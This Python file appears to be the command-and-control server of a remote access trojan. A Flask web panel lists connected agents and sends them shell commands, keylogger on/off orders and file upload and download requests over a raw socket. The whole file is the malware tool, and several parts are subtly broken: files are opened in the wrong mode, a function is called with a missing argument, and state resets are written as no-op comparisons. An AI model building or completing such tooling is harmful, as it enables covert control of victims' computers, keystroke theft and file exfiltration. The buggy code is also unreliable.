from os import close
import socket
import threading,time
import flask
from flask import *
from pathlib import Path

thread_index = 0
THREADS = []
CMD_INPUT = []
CMD_OUTPUT = []
IP = []

for i in range(20):
    #THREADS.append('')
    CMD_INPUT.append('')
    CMD_OUTPUT.append('')
    IP.append('')

app = Flask(__name__)

def handle_connection(connection, address, thread_index):
    global CMD_OUTPUT, CMD_INPUT
    
    
    while CMD_INPUT[thread_index] != 'quit':
        msg = connection.recv(1024).decode()
        CMD_OUTPUT[thread_index] = msg
        
        while True:
            if  CMD_INPUT[thread_index]!= '':
                if CMD_INPUT[thread_index].split(" ")[0]=='download':
                    filename = CMD_INPUT[thread_index].split(" ")[1].split("\\")[-1]
                    print(filename)
                    cmd = CMD_INPUT[thread_index]
                    connection.send(cmd.encode())
                    contents = connection.recv(1024*10000)
                    f = open(filename,'rb')
                    f.write(contents)
                    f.close()
                    CMD_OUTPUT[thread_index] = "File Downloaded Successfully"
                    CMD_INPUT[thread_index]= '' 
                     
                elif CMD_INPUT[thread_index].split(" ")[0]=='upload':
                    cmd = CMD_INPUT[thread_index]
                    connection.send(cmd.encode())
                    filename = CMD_INPUT[thread_index].split(" ")[1]
                    filesize = CMD_INPUT[thread_index].split(" ")[2]
                    f = open('.\\output\\'+filename,'wb')
                    contents = f.read()
                    f.close()
                    connection.send(contents)
                    msg = connection.recv(2048).decode()
                    if msg == 'received file':
                        CMD_OUTPUT[thread_index] = 'File Sent Successfully'
                        CMD_INPUT[thread_index]!= ''
                    else:
                        CMD_OUTPUT[thread_index] = 'Some Error Occurred'
                        CMD_INPUT[thread_index]!= ''
                
                
                elif CMD_INPUT[thread_index] == 'keylog on':
                    cmd = CMD_INPUT[thread_index]
                    connection.send(cmd.encode())
                    msg = connection.recv(2048).decode()
                    CMD_OUTPUT[thread_index]=msg
                    CMD_INPUT[thread_index]!= ''
                
                elif CMD_INPUT[thread_index] == 'keylog off':
                    cmd = CMD_INPUT[thread_index]
                    connection.send(cmd.encode())
                    msg = connection.recv(2048).decode()
                    CMD_OUTPUT[thread_index]=msg
                    CMD_INPUT[thread_index]!= ''

                
                else:
                    msg = CMD_INPUT[thread_index]
                    connection.send(msg.encode())
                    CMD_INPUT[thread_index] = ''
                    break
    close_connection(connection)

def close_connection(connection,thread_index):
    connection.close()
    THREADS[thread_index] = ''
    IP[thread_index] = ''
    CMD_INPUT[thread_index] = ''
    CMD_OUTPUT[thread_index] = ''

def server_socket():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('localhost', 9999))
    server_socket.listen(5)
    global THREADS
    global IP
    while True:
        connection, address = server_socket.accept()
        thread_index = len(THREADS)
        t = threading.Thread(target=handle_connection, args=(connection, address, len(THREADS)))
        THREADS.append(t)
        IP.append(address)
        t.start()

@app.before_request
def init_server():
    s1 = threading.Thread(target=server_socket)
    s1.start()

@app.route("/")
def root():
    return redirect(url_for('home'))

@app.route("/home")
def home():
    return render_template("index.html")

@app.route("/agents")
def agents():
    return render_template('agents.html', threads=THREADS, ip=IP)

@app.route("/<agentname>/executecmd")
def executecmd(agentname):
    return render_template("execute.html",name=agentname)

@app.route("/<agentname>/execute",methods=['Get','POST'])
def execute(agentname):
    if request.method=='POST':
        cmd = request.form.get('command')
        for i in THREADS:
            if agentname in i.name:
                req_index = THREADS.index(i)
        CMD_INPUT[req_index] = cmd
        time.sleep(5)
        cmdoutput = CMD_OUTPUT[req_index]
        return render_template('execute.html',cmdoutput=cmdoutput,name=agentname)

if __name__ == '__main__':
    app.run(debug=True)
